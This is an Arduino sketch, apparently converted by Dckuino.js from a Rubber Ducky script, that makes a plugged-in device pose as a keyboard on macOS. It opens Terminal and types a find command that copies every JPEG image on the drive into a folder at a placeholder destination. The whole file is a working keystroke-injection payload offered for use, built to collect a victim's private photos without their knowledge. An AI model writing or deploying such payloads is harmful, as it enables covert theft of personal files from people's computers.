// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script opens the terminal.
  // It searches for all JPEG image files located on the entire hard drive.
  // It copies the found JPEG images to a folder named "Images" in the destination of your choice.
  // Author: Narsty
  // Title: Copy All JPEG Images
  // Target: MacOS
  // Version: 1.0
  // Category:
  delay(300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("find / -type f -iname \"*.jpeg\" -exec cp {} ~/Insert Destination here /Images/ \\;");

  delay(2000);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}